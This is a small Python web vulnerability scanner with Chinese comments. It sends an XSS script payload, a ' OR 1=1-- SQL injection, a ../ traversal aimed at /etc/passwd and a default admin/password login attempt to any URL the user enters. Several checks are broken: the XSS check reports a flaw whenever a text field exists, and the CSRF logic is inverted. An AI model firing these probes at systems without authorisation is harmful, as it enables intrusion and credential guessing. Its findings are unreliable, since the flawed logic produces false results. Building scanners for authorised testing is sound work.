import requests 
from bs4 import BeautifulSoup
import re

# 检测XSS漏洞
def detect_xss(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                if input_tag.get('type') == 'text':
                    payload = "<script>alert('XSS Vulnerability Found!');</script>"
                    input_tag['value'] = payload
                    print("[+] XSS vulnerability found!")
                    return
        print("x XSS")
    except Exception as e:
        print("!! ERROR:", str(e))

# 检测SQL注入漏洞 TODO

def detect_sql_injection(url):
    try:
        # 构造带有SQL注入Payload的URL
        payload = "' OR 1=1--"
        injection_url = url + "?id=" + payload
        response = requests.get(injection_url)
        
        # 分析响应，查找是否存在漏洞
        if 'error in your SQL syntax' in response.text:
            print("[+] SQL Injection Vulnerability Found!")
        else:
            print("x SQL Injection")
    except Exception as e:
        print("!! ERROR:", str(e))

# 检测CSRF漏洞 TODO
def detect_csrf(url, session):
    try:
        # 发送一个GET请求以获取页面内容和可能的CSRF令牌
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 在表单中查找CSRF令牌
        forms = soup.find_all('form')
        for form in forms:
            csrf_input = form.find('input', {'name': '_csrf'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
                # 发送一个POST请求，尝试使用错误的令牌来提交表单
                malicious_request = session.post(url, data={'_csrf': 'malicious_token'})
                if malicious_request.status_code != 200:
                    print("[+] CSRF Vulnerability Found!")
                    return
        print("x CSRF")
    except Exception as e:
        print("!! ERROR:", str(e))

# 密码爆破函数 TODO
def try_login(url, username, password):
    try:
        # 构造登录请求
        login_url = url + "/login"
        login_data = {'username': username, 'password': password}
        response = requests.post(login_url, data=login_data)
        
        # 检查登录是否成功
        if response.status_code == 200 and 'Login failed' not in response.text:
            print("[+] Login Successful! With Username:", username, "and Password:", password)
        else:
            print("x Login")
    except Exception as e:
        print("!! ERROR:", str(e))

# 敏感信息泄露检测函数 TODO
def detect_sensitive_info_leakage(url):
    try:
        response = requests.get(url)
        # 在页面源代码中查找敏感信息，例如密码、API密钥等
        sensitive_info = re.findall(r'(password|api_key|secret_key)=\w+', response.text)
        if sensitive_info:
            print("[+] Potential Sensitive Information Leakage Found!")
            print("   - Sensitive Information:", sensitive_info)
        else:
            print("x Information Leakage")
    except Exception as e:
        print("!! ERROR:", str(e))

# 目录遍历漏洞检测函数 TODO
def detect_directory_traversal(url):
    try:
        # 构造目录遍历Payload
        traversal_url = url + "../../../../../../../../etc/passwd"
        response = requests.get(traversal_url)
        
        # 检查响应中是否包含敏感文件内容
        if 'root:' in response.text:
            print("[+] Directory Traversal Vulnerability Found")
        else:
            print("x Directory Traversal")
    except Exception as e:
        print("!! ERROR:", str(e))

# 服务端信息泄露检测函数 TODO
def detect_server_info_leakage(url):
    try:
        response = requests.get(url)
        server_header = response.headers.get('Server')
        if server_header:
            print("[+] Server Information Leakage Found")
            print("   - Server Header:", server_header)
        else:
            print("x Server Information Leakage")
    except Exception as e:
        print("!! ERROR:", str(e))


print("Web Vulnerability Scanner CLI")
print("----------------------------")
url = input("Enter URL: ")
# username = input("Enter the login-try username: ")
# password = input("Enter the login-try password: ")
username = "admin"
password = "password"

# 创建一个会话对象，以便跨多个请求保持会话状态
session = requests.Session()

vulnerabilities = []
print("Scanning")
detect_xss(url)
detect_sql_injection(url)
detect_csrf(url, session)
try_login(url, username, password)
detect_sensitive_info_leakage(url)
detect_directory_traversal(url)
detect_server_info_leakage(url)